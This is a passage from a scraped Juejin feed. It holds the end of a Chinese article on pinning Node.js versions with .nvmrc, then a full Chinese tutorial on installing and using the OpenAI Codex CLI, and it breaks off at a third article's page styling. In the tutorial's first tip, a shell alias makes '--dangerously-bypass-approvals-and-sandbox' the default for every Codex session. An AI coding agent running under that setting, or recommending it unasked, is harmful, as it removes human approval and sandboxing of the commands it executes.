<p><strong>团队规范</strong>：在团队中，应将“项目必须包含 <code>.nvmrc</code>文件”作为一项强制约定。这是成本最低、效果最显著的统一开发环境的方法。</p>
<p><strong>CI/CD 集成</strong>：在自动化构建和部署流程中，<code>.nvmrc</code>同样能发挥作用。例如，在 GitHub Actions 中，你可以直接使用它来设置 Node 环境：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">使用</span> <span class="hljs-string">.nvmrc</span> <span class="hljs-string">设置</span> <span class="hljs-string">Node.js</span>
  <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
  <span class="hljs-attr">with:</span>
    <span class="hljs-attr">node-version-file:</span> <span class="hljs-string">'.nvmrc'</span>
</code></pre>
<p><strong>双保险策略</strong>：你还可以在 <code>package.json</code>中用 <code>engines</code>字段再次声明 Node 版本范围，让包管理器（如 yarn、pnpm）也参与版本检查。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=20.10.0 &lt;21"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">最佳实践总结</h3>
<ol>
<li><strong>精确版本</strong>：为生产项目在 <code>.nvmrc</code>中指定<strong>精确版本号</strong>（如 <code>v20.10.0</code>），而非模糊的主版本号，这是杜绝意外的最可靠方式。</li>
<li><strong>个人必配自动切换</strong>：强烈建议每位开发者都配置 Shell 自动切换，这将极大提升开发体验。</li>
<li><strong>团队必提交 .nvmrc</strong>：将 <code>.nvmrc</code>视为项目必需品，如同 <code>package.json</code>一样提交到代码库。</li>
<li><strong>环境穿透</strong>：在 Dockerfile、CI 配置等所有环境定义中，都优先读取 <code>.nvmrc</code>来设置 Node 版本，实现从开发到生产的全链路一致。</li>
</ol>
<p>通过 <code>nvm</code>和 <code>.nvmrc</code>这套简单而强大的组合拳，你可以轻松管理复杂的 Node.js 版本环境。无论是个人项目还是大型团队协作，它都是保障开发顺畅、减少无谓调试时间的基础设施。现在就为你手头的项目创建一个 <code>.nvmrc</code>文件吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧]]></title>    <link>https://juejin.cn/post/7603010441149743145</link>    <guid>https://juejin.cn/post/7603010441149743145</guid>    <pubDate>2026-02-05T09:56:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603010441149743145" data-draft-id="7603142147642851371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-05T09:56:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱吃的小肥羊"/> <meta itemprop="url" content="https://juejin.cn/user/2637045249608064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637045249608064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱吃的小肥羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:56:00.000Z" title="Thu Feb 05 2026 09:56:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你是一名程序员，大概知道OpenAI的Codex，最近关于Codex和Claude code谁更厉害的争得是愈演愈烈，虽然大家都在说Claude code好用，但是不乏一些资深的程序员说Codex好用。</p>
<p>给出的原因很简单：Codex的bug更少，上下文更长，唯一的缺点就是太慢了。</p>
<p>这里紧急插播一条新闻：GPT的模型已经提速了，提升了40%。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df734e8a6fe47a99022f310f20273b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=ExNRpdU3Scp0rb45HkFquBGFxLE%3D" alt="" loading="lazy"/></p>
<p>最近，Codex发布了macOS应用，这意味着国内越来越多的开发者可以便捷地使用它。不过很多人刚开始接触Codex时往往一脸懵它怎么安装？怎么用？为什么有这么多配置参数？</p>
<p>本文就来系统解决这些问题。我会从Codex的基本概念讲起，手把手教你在本地快速部署CLI环境，最后再分享15个我在实际开发中总结的高效使用技巧。这些技巧涵盖从快捷操作到高级配置，足以让你从新手升级到进阶用户。</p>
<p>如果你还想要使用Claude code，可以看我另外一篇文章，有介绍三种方法。</p>
<p>相关阅读：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1992313721415046720" target="_blank" title="https://zhuanlan.zhihu.com/p/1992313721415046720" ref="nofollow noopener noreferrer">手把手教你在国内使用 Claude Code：不封号、不折腾、比官网更便宜</a></p>
<hr/>
<h2 data-id="heading-0">一Codex是什么？为什么值得关注</h2>
<p>Codex应该是OpenAI专为编程打造的AI模型。和通用的ChatGPT相比，它有几个明显优势。代码理解和生成能力远超通用模型，能准确把握编程逻辑、语法规范和最佳实践。</p>
<p>支持40多种编程语言，Python、JavaScript、Go都能轻松搞定。更关键的是，它不仅生成代码，还能理解代码、调试错误、重构逻辑基本是个高级程序员的升级版。</p>
<p>你可以在终端里敲命令（CLI），也可以在VS Code里弹出AI建议（IDE插件），还可以通过SDK集成到自己的应用，或者直接上网页用（云端）。本文主要讲CLI方案，因为它给开发者最大的灵活性。</p>
<p>虽然说得很AI感，但是用户唯一认可它的，就是好用。</p>
<hr/>
<p>那它到底能怎么用？</p>
<h2 data-id="heading-1">二、哪些用户可以使用Codex</h2>
<p>目前只有付费用户才能使用Codex，比如Plus、Pro、Team等会员，如果你还不会开通会员，可以看我之前的文章。</p>
<p>相关阅读：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F2002399500036219170" target="_blank" title="https://zhuanlan.zhihu.com/p/2002399500036219170" ref="nofollow noopener noreferrer">ChatGPT如何充会员？WildAI、Google Play、礼品卡5种方法实测对比</a></p>
<p>那免费用户可以用吗？其实也可以，只不过需要搭配着OpenAI的API才能用，在后面的使用技巧那里有详细的介绍，感兴趣的可以看看。</p>
<p>Codex安装教程，CLI环境快速上手：从零到启动</p>
<p>第一步：安装Node.js</p>
<p>Codex CLI基于Node.js开发，因此你首先需要在本地安装它。访问<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F" target="_blank" title="https://nodejs.org/" ref="nofollow noopener noreferrer">Node.js官网</a>，按照你的系统版本（Windows/Mac/Linux）下载合适的安装程序。由于涉及命令行工具链，建议下载LTS长期支持版本，稳定性更好。</p>
<p>安装完成后，打开终端验证一下：</p>
<p>node -v npm -v<br/>
能看到版本号就说明安装成功了。</p>
<p>第二步：安装Codex CLI</p>
<p>现在用npm全局安装Codex：npm i -g @openai/codex</p>
<p>得到如下结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0525070b4024f2caf30dc51dad6eb2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=B4iIIFCSTCRkc%2BDgOf01Y%2F637Y0%3D" alt="" loading="lazy"/></p>
<p>这条命令会从npm仓库下载Codex包并全局安装，这样你在任何目录下都能直接使用<code>codex</code>命令。安装可能需要一两分钟，取决于你的网络。</p>
<p>第三步：登录与验证</p>
<p>安装好后，在终端输入：codex</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7862f2ca484f451a8393615090ca415e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=nOan0wSq0MhvXRnv%2BF16OWistNw%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74aac8db0a6c48959c4030c4da434b9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=GbSbBcWjlNUHLCY%2BQGTIf%2FeszFY%3D" alt="" loading="lazy"/></p>
<p>返回命令行窗口 ，显示如下界面</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a28b309e87c461c9f8473a6108448ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=O0ndIzrPoBJSxc1QdoWE0TQAGFA%3D" alt="" loading="lazy"/></p>
<p>一直回车</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c0dd8ad8a474f32b6ad9a6e98a9cb34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=w7vUdiGKCV9feOj4uJd0epZTrn0%3D" alt="" loading="lazy"/></p>
<p>输入hello测试一下，能正常返回结果即表示能够正常使用：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd80348e336d4c4c8e63ce1f52537dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=xuWMyA%2B7luTdYDWBLMNbIwtARWw%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">三、15个核心技巧：从基础到进阶</h2>
<p>基础操作类</p>
<p><strong>1. 设置别名加速启动</strong></p>
<p>每次启动都要等待模型加载，有没有办法让常用配置预先生效？当然有。你可以为Codex设置别名，把常用参数绑定进去。</p>
<p>在Mac上，编辑你的shell配置文件：</p>
<blockquote>
<p>echo "alias codex='codex -m gpt-5-codex -c model_reasoning_effort="high" -c model_reasoning_summary_format=experimental --search --dangerously-bypass-approvals-and-sandbox'" &gt;&gt; ~/.zshrc source ~/.zshrc</p>
</blockquote>
<p>Windows用户可以通过设置系统环境变量实现类似效果。这样下次只需输入<code>codex</code>，所有参数就自动加载了，省去手工调整的麻烦。</p>
<p><strong>2. 快捷命令速查表</strong></p>
<p>Codex内置了一套快捷命令系统。在会话中输入<code>/</code>就能看到所有可用命令。最常用的有三个——输入<code>/model</code>切换模型和推理等级，输入<code>/new</code>开启新会话，输入<code>/status</code>查看Token用量。想看更多？输入<code>/</code>就能把全部命令响光一遍。熟记这几个常用的，能推高工作效率。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/965500e38f9244ef9f2e9fd67664c366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=kMckERvw%2BxDPwdA3nJdL3OKZWYw%3D" alt="" loading="lazy"/></p>
<p><strong>3. 快速换行输入</strong></p>
<p>编写复杂提示词时，长行代码看起来很凌乱。按<code>Option + Enter</code>（Mac）或<code>Control + J</code>（Windows/Linux）可以快速换行，让输入更易读。这个看似不起眼的快捷键，在处理多行指令时特别有用。</p>
<p><strong>4. 中断与退出操作</strong></p>
<p>Codex在执行任务时，有时需要打断。按<code>ESC</code>键或<code>Control + C</code>可以立即中断当前请求。如果想彻底退出会话，再按一次<code>Control + C</code>或直接输入<code>/quit</code>。这些操作给了你完整的控制权，避免被卡住。</p>
<p><strong>5. 通过API使用Codex</strong></p>
<p>如果你没有ChatGPT Plus订阅，也能通过付费API的方式使用Codex。修改配置文件<code>~/.codex/config.toml</code>，添加：preferred_auth_method = "apikey"</p>
<p>然后配置你的OpenAI API Key。这种方式特别适合企业用户或需要按需计费的场景。</p>
<p>更多费用明细查看官方说明：<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fopenai.com%2Fapi%2Fpricing%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//openai.com/api/pricing/" ref="nofollow noopener noreferrer">openai.com/api/pricing…</a></p>
<p><strong>6. 切换模型与推理等级</strong></p>
<p>Codex的核心是模型选择。默认使用的<code>gpt-5.2-codex</code>是OpenAI最强的代码专用模型，但你也可以根据需要切换。使用<code>/model</code>命令进入交互式选择，或者启动时指定参数：codex -m gpt-5.2 -c model_reasoning_effort="high"</p>
<p>推理等级有三档：低、中、高。高等级会花更长时间思考，但输出质量更好。我通常在解决复杂问题时用高等级，日常工作用中等级。</p>
<p><strong>7. 权限模式精细控制</strong></p>
<p>Codex默认用Auto模式——可以读写文件、运行命令，但跨目录操作需要你确认。只想聊天或规划？切换到Read Only只读模式，完全不用担心误操作。</p>
<p>需要自动化？用Full Access（但要小心！）。Auto是安全与效率的平衡；只读是探索学习时的保障；完全访问唯一的优先是效率最快。</p>
<p><strong>8. 网络搜索能力激活</strong></p>
<p>默认情况下，Codex只能访问本地数据。如果你需要它查询最新的库文档、API说明或Stack Overflow答案，启用网络搜索：codex --search</p>
<p>启用后，Codex会先上网收集信息再回答，答案会带有参考链接。这在处理快速变化的技术领域时特别有价值。</p>
<p><strong>9. 初始化项目指导文件AGENTS.md</strong></p>
<p>AGENTS.md是Codex特有的配置格式。你可以把它看作给AI编程助手准备的README——里面定义了项目结构、编程规范、目标文件等上下文。运行<code>/init</code>命令会自动生成默认的英文AGENTS.md，手动翻译成中文后效果更好。</p>
<p>一个完整的AGENTS.md能让Codex理解你的项目逻辑，显著提升代码质量。</p>
<p><strong>10. 查看配置与Token用量</strong></p>
<p>使用<code>/status</code>命令能看到当前会话的详细信息：账户状态、模型信息、已用Token数等。这对控制成本和调试问题都很有用。如果发现Token消耗过快，可能是上下文过大，考虑使用<code>/compact</code>压缩。</p>
<p>进阶功能类</p>
<p><strong>11. 文件引用和图像输入</strong></p>
<p>你可以用<code>@文件名</code>的方式直接引用项目中的文件，让Codex了解代码上下文。更强大的是，Codex支持图像输入——直接粘贴截图或使用<code>-i</code>参数附加图片文件：</p>
<p>codex -i screenshot.png "解释这个错误堆栈"<br/>
这在调试GUI应用或分析设计稿时特别管用。</p>
<p><strong>12. 脚本执行与自动化</strong></p>
<p>如果你想在CI/CD流水线中使用Codex，可以用<code>exec</code>命令以非交互方式运行：</p>
<p>codex exec "修复这个JavaScript的类型错误"<br/>
这让Codex不仅是交互工具，更成为自动化工作流的一部分。</p>
<p><strong>13. MCP协议集成</strong></p>
<p>Codex支持Model Context Protocol（MCP），这让你能集成第三方工具和数据源。比如连接到你的代码库、数据库或专业工具。编辑<code>~/.codex/config.toml</code>添加MCP服务器配置，就能扩展Codex的能力边界。</p>
<p><strong>14. 上下文压缩</strong></p>
<p>长期会话中，上下文会不断累积，最终触发限制。使用<code>/compact</code>命令能智能压缩历史记录，保留关键信息同时节省Token。这对长期项目特别重要。</p>
<p><strong>15. 灵活的配置文件管理</strong></p>
<p>所有配置都存在<code>~/.codex/config.toml</code>里。你可以为不同项目设置不同的信任等级和参数。比如：</p>
<p>model = "gpt-5-codex" [projects."/path/to/project"] trust_level = "trusted"<br/>
这种基于项目的配置让你能对不同工作采用不同策略，既安全又灵活。</p>
<hr/>
<p>国内用户特别提醒</p>
<p>如果你在中国使用Codex，有几点需要注意。首先，访问OpenAI服务需要稳定的网络环境。其次，如果用API方式，需要配置有效的支付方式。建议使用国际信用卡或通过代理服务商。</p>
<p>最后一个提示——Codex的价格取决于Token使用量。GPT-5-Codex的API价格最高，日常工作如果资源有限，可以考虑切换到成本更低的模型。但如果是商业项目，投资在最强的模型上往往能带来更高回报。</p>
<hr/>
<p>对于国内开发者而言，<strong>Codex 怎么用</strong>的核心难点在于网络环境的配置以及对 CLI 工具链的熟悉程度。通过 Node.js 安装 CLI，配置 API Key 解决认证问题，再配合 Alias 和 AGENTS.md 等技巧，你完全可以在本地打造一个比 GitHub Copilot 更强大、更可控的 AI 编程助手。</p>
<p><strong>AI 不会淘汰程序员，但它是会淘汰那些不会使用 AI 的程序员。</strong> 既然工具已经交到了你手上，不妨现在就打开终端，试着敲下那行 codex 吧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500]]></title>    <link>https://juejin.cn/post/7603160727718150195</link>    <guid>https://juejin.cn/post/7603160727718150195</guid>    <pubDate>2026-02-05T10:13:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727718150195" data-draft-id="7603186080493600819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T10:13:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            硅谷又炸了，Clawdbot 开始雇佣人类！2 万人排队卖身，时薪狂飙 3500
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:13:32.000Z" title="Thu Feb 05 2026 10:13:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body 